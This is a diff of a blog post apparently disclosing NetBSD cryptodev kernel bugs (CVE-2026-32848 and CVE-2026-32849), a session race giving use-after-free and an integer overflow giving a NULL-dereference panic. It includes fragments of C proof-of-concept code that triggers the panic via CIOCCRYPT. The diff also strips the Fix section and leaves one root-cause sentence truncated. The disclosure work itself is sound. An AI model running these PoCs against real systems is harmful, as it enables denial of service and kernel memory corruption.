@@ -3,13 +3,13 @@ title: "[Netbsd - cryptodev] One integer overflow and plenty of UAF"
 tags: ["vr", "vulnerability research", "netbsd", "uaf", "nasm", "pwn", "linux", "kernel", "kernel exploitation", "cryptodev"]
 published: 2026-02-06
 category: "research"
-draft: True
+draft: False
 ---
 
 # Introduction
 
 The NetBSD `opencrypto` framework provides a standardized interface for kernel-level cryptographic operations, allowing userspace applications to leverage hardware acceleration.
-This post breaks down three distinct vulnerabilities discovered in the `ioctl` handling of the crypto operations in `/dev/crypto` reachable from an unpriviledged user. These vulnerabilities were discovered through fuzzing with Syzkaller. These bugs were assigned: CVE-2026-32848 (Session lifecycle race condition → UAF / double-free) and CVE-2026-32849 (Integer handling flaw → NULL pointer dereference). This post is not realeased yet because these bugs are under coordinated disclosure.
+This post breaks down three distinct vulnerabilities discovered in the `ioctl` handling of the crypto operations in `/dev/crypto` reachable from an unpriviledged user. These vulnerabilities were discovered through fuzzing with Syzkaller. These bugs were assigned: CVE-2026-32848 (Session lifecycle race condition → UAF / double-free) and CVE-2026-32849 (Integer handling flaw → NULL pointer dereference).
 
 ### UAF, Double-Free, and NULL Dereference
 
@@ -19,7 +19,7 @@ The vulnerabilities found in `cryptof_ioctl` and `cryptodev_op` highlight a fund
 
 * **Concurrent UIO Race:** (linked to the first bug) By storing mutable request state directly within the shared session structure, the kernel fails to protect against multiple threads using the same session ID. This leads to a heap corruption (uaf or double free depending on the window) as threads overwrite each other's allocations.
 
-* **Integer overflow (leading to CWE-476):** A logic error in `cryptodev_op` allows a user-controlled unsigned value to overflow a signed integer. This causes the kernel to bypass critical memory allocations while continuing with data copies, resulting in a **NULL Pointer Dereference** and a system-wide kernel panic.
+* **Integer overflow (leading to CWE-476):** A logic error in `cryptodev_op` allows a user-controlled unsigned value to overflow a signed integer. This causes the kernel to bypass critical memory allocations while continuing with data copies, resulting in a **NULL Pointer Dereference** and a kernel panic.
 
 # Race Condition in `cryptof_ioctl` / `cryptodev_op`: Use-After-Free & Double-Free
 
@@ -64,11 +64,6 @@ Both bugs share the same underlying cause: `csession` embeds mutable per-operati
 ## Proof of Concept
 
 See attached PoC. `poc_uaf_cioccrypt_race()` races `CIOCCRYPT` against `CIOCFSESSION` to trigger Bug 1. `poc_uio_race()` hammers the same session from 8 threads to trigger Bug 2.
-
-## Fix
-
-- Add a per-`csession` reference count (or rwlock) incremented by `csefind` and decremented after `cryptodev_op` returns, so `csefree` blocks until all in-flight operations complete.
-- Move `uio`/`iovec` off the `csession` struct and onto the stack (or a per-call allocation) inside `cryptodev_op` to eliminate the shared mutable state entirely.
 
 ```c
 #include <sys/types.h>
@@ -234,7 +229,7 @@ main(void)
 
 ## Root Cause
 
-`iov_len` is declared as `int` (signed) but assigned from `cop->dst_len` which is `u_int` (unsigned). When `cop->dst_len > INT_MAX`, the assignment produces a negative value — undefined behavior per the C standard. On x86-64 with `-O2`, the compiler may eliminate the subsequent safety check entirely.
+`iov_len` is declared as `int` (signed) but assigned from `cop->dst_len` which is `u_int` (unsigned). When `cop->dst_len > INT_MAX`.
 
 ```c
 int iov_len = cop->len;           /* signed */
@@ -272,22 +267,6 @@ Proof-of-concept:
 #include <stdlib.h>
 #include <string.h>
 #include <err.h>
-
-/*
- * PoC: two bugs demonstrated
- *
- * Bug A: iov_len signed overflow → NULL iov_base → copyin NULL ptr
- *   Requires: tcomp session, dst_len > INT_MAX
- *   Effect: copyin(src, NULL, len) → kernel fault
- *
- * Bug B: large iov_len allocation via dst_len, then early bail
- *   via cop->iv on compression-only session (crde==NULL)
- *   Effect: allocates large buffer, bails, frees correctly BUT
- *           the copyin into that large buffer happens BEFORE the
- *           iv check — so we get copyin of 16 bytes into a large
- *           buffer then free it — demonstrates the logic inversion
- *           (should validate iv before allocating)
- */
 
 static int
 open_crypto(void)
@@ -355,8 +334,6 @@ bug_a_null_iov_base(void)
     cop.iv      = NULL;
     cop.mac     = NULL;
 
-    printf("[*] Bug A: dst_len=0x%x → iov_len overflow\n", cop.dst_len);
-    printf("    expected: copyin to NULL → kernel fault/panic\n");
     if (ioctl(fd, CIOCCRYPT, &cop) < 0)
         warn("    CIOCCRYPT returned error (may have faulted in kernel)");
     else
@@ -368,9 +345,7 @@ bug_a_null_iov_base(void)
 int
 main(void)
 {
-    printf("=== cryptodev_op vulnerability PoC ===\n\n");
-
-    printf("--- Bug A: iov_len signed overflow ---\n");
+    printf("--- iov_len signed overflow ---\n");
     bug_a_null_iov_base();
     printf("\n");
     return 0;
